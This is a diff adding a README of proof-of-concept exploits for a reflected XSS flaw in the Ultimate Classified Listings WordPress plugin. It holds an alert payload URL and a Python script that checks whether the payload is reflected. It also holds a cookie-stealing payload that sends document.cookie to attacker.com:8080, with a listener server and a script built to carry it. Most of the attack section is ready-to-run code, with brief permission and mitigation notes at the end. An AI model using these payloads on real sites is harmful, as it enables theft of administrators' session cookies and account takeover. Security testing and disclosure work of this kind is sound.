@@ -1,0 +1,133 @@
+# Proof of Concept (PoC) for Vulnerabilities in WordPress Plugins
+
+This repository contains Proof of Concept (PoC) scripts for various vulnerabilities discovered in different WordPress plugins. These scripts demonstrate how attackers can exploit these vulnerabilities to perform malicious actions. 
+
+## Table of Contents
+
+- [Vulnerabilities Covered](#vulnerabilities-covered)
+- [Setup and Usage](#setup-and-usage)
+  - [Reflected XSS in Ultimate Classified Listings Plugin](#reflected-xss-in-ultimate-classified-listings-plugin)
+  - [Stealing Cookies Using XSS](#stealing-cookies-using-xss)
+- [Important Considerations](#important-considerations)
+
+## Vulnerabilities Covered
+
+1. **Reflected Cross-Site Scripting (XSS) in Ultimate Classified Listings Plugin**
+   - A vulnerability in the Ultimate Classified Listings WordPress plugin before version 1.4 allows attackers to execute arbitrary JavaScript by injecting malicious scripts through unsanitized parameters.
+
+2. **Stealing Cookies Using XSS**
+   - Demonstrates how an attacker can exploit the reflected XSS vulnerability to steal cookies of high-privilege users, such as admins, by sending the cookies to a malicious server.
+
+## Setup and Usage
+
+### Reflected XSS in Ultimate Classified Listings Plugin
+
+This PoC demonstrates how to exploit the reflected XSS vulnerability in the Ultimate Classified Listings plugin.
+
+1. **Identify the Vulnerable Parameter**:
+   - Assume the vulnerable parameter is `search` in the URL `http://example.com/classifieds`.
+
+2. **Craft a Malicious URL**:
+   - The malicious URL can include a payload to execute an alert dialog:
+     ```plaintext
+     http://example.com/classifieds?search=<script>alert('XSS')</script>
+     ```
+
+3. **Run the PoC Script**:
+   - Save the following script as `xss_poc.py` and run it.
+   
+   ```python
+   import requests
+
+   # Configuration
+   target_url = "http://example.com/classifieds"  # Change this to the target site's URL
+   payload = "<script>alert('XSS')</script>"  # XSS payload
+
+   def trigger_xss():
+       # Construct the malicious URL
+       malicious_url = f"{target_url}?search={payload}"
+
+       # Send a GET request to the malicious URL
+       response = requests.get(malicious_url)
+
+       # Check if the payload is reflected in the response
+       if payload in response.text:
+           print("[+] XSS payload reflected in the response.")
+           print("[+] Malicious URL:", malicious_url)
+       else:
+           print("[-] XSS payload not reflected in the response.")
+
+   if __name__ == "__main__":
+       trigger_xss()
+   ```
+
+### Stealing Cookies Using XSS
+
+This PoC demonstrates how an attacker can exploit the reflected XSS vulnerability to steal cookies from high-privilege users.
+
+1. **Setup a Malicious Server**:
+   - Save the following script as `malicious_server.py` and run it to start a server that logs incoming requests (including cookies).
+   
+   ```python
+   from http.server import BaseHTTPRequestHandler, HTTPServer
+   import logging
+
+   class RequestHandler(BaseHTTPRequestHandler):
+       def do_GET(self):
+           logging.info(f"Received request: {self.headers}")
+           self.send_response(200)
+           self.end_headers()
+
+   def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
+       logging.basicConfig(filename='server.log', level=logging.INFO)
+       server_address = ('', port)
+       httpd = server_class(server_address, handler_class)
+       logging.info(f'Starting server on port {port}...')
+       httpd.serve_forever()
+
+   if __name__ == "__main__":
+       run()
+   ```
+
+2. **Craft a Payload to Steal Cookies**:
+   - Create a payload that sends the admin's cookies to the malicious server:
+     ```plaintext
+     http://example.com/classifieds?search=<script>new Image().src='http://attacker.com:8080?cookie='+document.cookie;</script>
+     ```
+
+3. **Run the PoC Script**:
+   - Save the following script as `steal_cookies_poc.py` and run it.
+   
+   ```python
+   import requests
+
+   # Configuration
+   target_url = "http://example.com/classifieds"  # Change this to the target site's URL
+   attacker_server = "http://attacker.com:8080"  # Change this to your malicious server's URL
+   payload = f"<script>new Image().src='{attacker_server}?cookie='+document.cookie;</script>"
+
+   def trigger_xss():
+       # Construct the malicious URL
+       malicious_url = f"{target_url}?search={payload}"
+
+       # Send a GET request to the malicious URL
+       response = requests.get(malicious_url)
+
+       # Check if the payload is reflected in the response
+       if payload in response.text:
+           print("[+] XSS payload reflected in the response.")
+           print("[+] Malicious URL:", malicious_url)
+       else:
+           print("[-] XSS payload not reflected in the response.")
+
+   if __name__ == "__main__":
+       trigger_xss()
+   ```
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test these vulnerabilities on the target site. Unauthorized access is illegal and unethical.
+- **Testing Environment**: Perform these tests in a controlled environment to avoid impacting production systems.
+- **Mitigation**: Update the Ultimate Classified Listings plugin to version 1.4 or later. Always sanitize and escape user inputs before including them in the output.
+
+These PoCs demonstrate how an attacker could exploit vulnerabilities in WordPress plugins to perform malicious actions. Always keep your software up-to-date and follow security best practices to prevent such vulnerabilities.
